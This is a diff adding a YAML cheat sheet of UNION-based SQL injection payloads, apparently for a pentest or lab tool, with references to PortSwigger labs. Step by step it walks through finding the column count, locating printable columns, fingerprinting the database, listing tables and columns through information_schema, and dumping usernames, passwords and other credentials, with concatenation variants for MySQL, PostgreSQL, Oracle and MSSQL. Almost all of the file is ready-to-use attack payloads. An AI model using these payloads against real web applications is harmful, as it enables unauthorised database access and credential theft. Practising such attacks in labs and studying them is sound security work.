@@ -1,0 +1,290 @@
+name: SQLi UNION Attacks
+
+steps:
+
+# =========================================================
+# [1] FIND COLUMN COUNT
+# =========================================================
+- title: Find Column Count
+  mode: chain
+  info: |
+    Determine how many columns are returned by the original query.
+
+  entries:
+
+    - cmd: "' UNION SELECT NULL--"
+      info: 1 column
+
+    - cmd: "' UNION SELECT NULL,NULL--"
+      info: 2 columns
+
+    - cmd: "' UNION SELECT NULL,NULL,NULL--"
+      info: 3 columns
+
+    - cmd: "' UNION SELECT NULL,NULL,NULL,NULL--"
+      info: 4 columns
+
+  look_for:
+    - errors disappear
+    - normal response returns
+    - reflected content
+
+  notes:
+    - continue adding NULL values until query succeeds
+    - NULL avoids datatype conflicts
+    - mysql may require:
+      - "-- "
+      - "#"
+
+
+# =========================================================
+# [2] FIND PRINTABLE COLUMNS
+# =========================================================
+- title: Find Printable Columns
+  mode: chain
+  info: |
+    Identify which columns can display text in the response.
+
+  entries:
+
+    - cmd: "' UNION SELECT 'a',NULL,NULL--"
+      info: text in column 1
+
+    - cmd: "' UNION SELECT NULL,'a',NULL--"
+      info: text in column 2
+
+    - cmd: "' UNION SELECT NULL,NULL,'a'--"
+      info: text in column 3
+
+    - cmd: "' UNION SELECT 'abc','def'--"
+      info: multiple printable columns
+
+  look_for:
+    - reflected values
+    - visible text in page response
+
+  notes:
+    - at least one printable column is required
+    - string payloads help identify reflected output
+
+
+# =========================================================
+# [3] RETRIEVE DATA
+# =========================================================
+- title: Retrieve Data
+  mode: enum
+  info: |
+    Extract data from known tables.
+
+  entries:
+
+    - cmd: "' UNION SELECT username,password FROM users--"
+      info: dump users table
+
+    - cmd: "' UNION SELECT email,password FROM users--"
+      info: dump emails
+
+    - cmd: "' UNION SELECT NULL,username FROM users--"
+      info: single printable column
+
+  look_for:
+    - credentials
+    - usernames
+    - admin accounts
+
+  notes:
+    - column count must match original query
+    - data types must match printable columns
+
+
+# =========================================================
+# [4] MULTIPLE VALUES IN ONE COLUMN
+# =========================================================
+- title: Concatenate Values
+  mode: enum
+  info: |
+    Combine multiple values into one printable column.
+
+  entries:
+
+    - cmd: "' UNION SELECT NULL,username||'~'||password FROM users--"
+      info: postgres / oracle concat
+
+    - cmd: "' UNION SELECT NULL,CONCAT(username,'~',password) FROM users--"
+      info: mysql concat
+
+    - cmd: "' UNION SELECT NULL,username+'~'+password FROM users--"
+      info: mssql concat
+
+  look_for:
+    - combined output
+    - separators between values
+
+  notes:
+    - useful when only one printable column exists
+    - use unique separators like:
+      - "~"
+      - ":"
+      - "|"
+
+
+# =========================================================
+# [5] DATABASE VERSION
+# =========================================================
+- title: Database Version
+  mode: enum
+  info: |
+    Fingerprint database type and version.
+
+  entries:
+
+    - cmd: "' UNION SELECT @@version,NULL--"
+      info: mysql / mssql version
+
+    - cmd: "' UNION SELECT version(),NULL--"
+      info: postgres version
+
+    - cmd: "' UNION SELECT banner,NULL FROM v$version--"
+      info: oracle version
+
+  look_for:
+    - mysql
+    - postgresql
+    - oracle
+    - microsoft sql server
+
+  notes:
+    - db fingerprinting helps choose payload syntax
+    - mysql comments may require:
+      - "#"
+      - "-- "
+
+
+# =========================================================
+# [6] ENUMERATE TABLES
+# =========================================================
+- title: Enumerate Tables
+  mode: enum
+  info: |
+    List database tables.
+
+  entries:
+
+    - cmd: "' UNION SELECT table_name,NULL FROM information_schema.tables--"
+      info: list tables
+
+    - cmd: "' UNION SELECT table_schema,table_name FROM information_schema.tables--"
+      info: schema + table names
+
+  look_for:
+    - users table
+    - accounts
+    - admins
+    - credentials
+    - sessions
+
+  notes:
+    - works on:
+      - mysql
+      - postgres
+      - mssql
+    - oracle uses different metadata tables
+
+
+# =========================================================
+# [7] ENUMERATE COLUMNS
+# =========================================================
+- title: Enumerate Columns
+  mode: enum
+  info: |
+    List columns from interesting tables.
+
+  entries:
+
+    - cmd: "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--"
+      info: enumerate users columns
+
+    - cmd: "' UNION SELECT column_name,data_type FROM information_schema.columns WHERE table_name='users'--"
+      info: column types
+
+  look_for:
+    - username
+    - password
+    - email
+    - api keys
+    - tokens
+
+  notes:
+    - portswigger labs randomize names
+    - replace:
+      - users
+      - username
+      - password
+    - with discovered values
+
+
+# =========================================================
+# [8] DUMP CREDENTIALS
+# =========================================================
+- title: Dump Credentials
+  mode: enum
+  info: |
+    Extract credentials from discovered tables.
+
+  entries:
+
+    - cmd: "' UNION SELECT username,password FROM <TABLE>--"
+      info: dump randomized users table
+
+    - cmd: "' UNION SELECT username_x,password_x FROM <TABLE>--"
+      info: randomized columns
+
+    - cmd: "' UNION SELECT NULL,username||':'||password FROM <TABLE>--"
+      info: combined output
+
+  look_for:
+    - admin credentials
+    - password hashes
+    - reusable creds
+
+  notes:
+    - portswigger labs commonly randomize:
+      - table names
+      - column names
+    - enumerate tables and columns first
+
+# =========================================================
+# [9] FULL UNION WORKFLOW
+# =========================================================
+- title: Example UNION Workflow
+  mode: chain
+  info: |
+    Full example workflow for UNION-based SQL injection.
+
+  entries:
+
+    - cmd: "' UNION SELECT NULL,NULL--"
+      info: determine column count
+
+    - cmd: "' UNION SELECT 'a','b'--"
+      info: identify printable columns
+
+    - cmd: "' UNION SELECT table_name,NULL FROM information_schema.tables--"
+      info: enumerate tables
+
+    - cmd: "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='<TABLE>'--"
+      info: enumerate columns
+
+    - cmd: "' UNION SELECT <USER_COL>,<PASS_COL> FROM <TABLE>--"
+      info: dump credentials
+
+  look_for:
+    - users table
+    - username columns
+    - password columns
+    - reflected values
+
+  notes:
+    - replace placeholders with discovered values
+    - use concatenation if only one printable column exists
+    - continue enumeration until useful data appears
